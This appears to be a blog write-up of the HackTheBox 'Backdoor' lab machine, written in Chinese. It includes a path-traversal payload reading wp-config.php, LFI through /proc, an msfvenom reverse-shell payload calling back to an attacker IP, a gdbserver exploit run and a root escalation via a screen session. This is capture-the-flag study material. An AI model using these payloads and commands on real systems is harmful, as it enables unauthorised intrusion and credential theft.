---
title: HackTheBox-backdoor
typora-root-url: ..
date: 2021-12-26 15:30:41
tags: HTB
---



## 简介

Hostname:backdoor.htb

IP:10.10.11.125

Os:linux

## 信息收集

```
nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.125
```

目标开放有：22  80  1337

其中 80端口为 WordPress  22 为ssh  1337 未知

使用WPScan对WordPress进行扫描，并查看漏洞，如可利用漏洞，枚举出一个admin用户

![image-20211226153404102](/assets/image-20211226153404102.png)

使用目录扫描工具进行扫描,发现个别目录存在目录遍历问题

![image-20211226153930569](/assets/image-20211226153930569.png)



## 漏洞尝试

### WordPress插件漏洞

其中 http://backdoor.htb/wp-content/plugins/ 中有一个插件，通过google搜索，发现存在目录穿越漏洞

payload：/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

使用读取到的数据库密码进行登录尝试失败，考虑到目标系统为linux，并且当前 1337 端口服务未知，使用 LFI 通过 proc 获取端口 1337 的信息。

```
/proc/$pid$/cmdline
```

![image-20211226155332092](/assets/image-20211226155332092.png)

此处剧透端口再 900-1000之间【没爆出来，后面登陆上后发现是 6889 】

1337 端口为 gdbserver ，存在 漏洞 https://www.exploit-db.com/exploits/50539

### gdbserver漏洞利用

使用msfvenom 生成木马

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.52 LPORT=4444 PrependFork=true -o rev.bin
```

nc监听该端口

```
nc -lvvp 4444
```

使用exploit 进行攻击，多次尝试过成功获取反弹 shell

```
python3 50539.py 10.10.11.125:1337 rev.bin
```

![image-20211226162056327](/assets/image-20211226162056327.png)

查看用户权限为 user，拿到第一个flag

![image-20211226162139294](/assets/image-20211226162139294.png)

使用 python获取交互式 shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20211226164521955](/assets/image-20211226164521955.png)

## 提权

使用 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh 枚举需要的信息

查找suid 应用

```
find / -user root -perm -4000 -print 2>/dev/null
```

此处通过观察 ps -ef 命令可以发现，root 用户使用screen启动了 Session，因此通过以下命令，切换到 root下

```
export TERM=xterm
screen -x root/root
```

获取到root shell

